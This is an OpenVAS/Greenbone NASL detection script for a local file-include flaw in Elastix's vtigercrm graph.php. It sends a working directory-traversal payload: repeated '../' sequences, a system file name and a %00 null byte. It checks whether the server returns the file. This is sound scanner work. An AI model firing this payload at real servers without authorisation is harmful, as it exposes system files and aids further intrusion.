# Copyright (C) 2012 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:elastix:elastix";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103540");
  script_version("2022-04-27T12:01:52+0000");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_tag(name:"last_modification", value:"2022-04-27 12:01:52 +0000 (Wed, 27 Apr 2022)");
  script_tag(name:"creation_date", value:"2012-08-18 12:55:37 +0200 (Sat, 18 Aug 2012)");
  script_name("Elastix 'graph.php' Local File Include Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_elastix_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("elastix/http/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/55078");

  script_tag(name:"summary", value:"Elastix is prone to a local file-include vulnerability
  because it fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to view
  files and execute local scripts in the context of the web server process. This may aid
  in further attacks.");

  script_tag(name:"affected", value:"Elastix 2.2.0 is vulnerable. Other versions may also
  be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one
  year since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

files = traversal_files("linux");

foreach file(keys(files)) {

  url = dir + "/vtigercrm/graph.php?current_language=" + crap(data:"../", length:9 * 6) + files[file] + '%00&module=Accounts&action';

  if(http_vuln_check(port:port, url:url, pattern:file)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);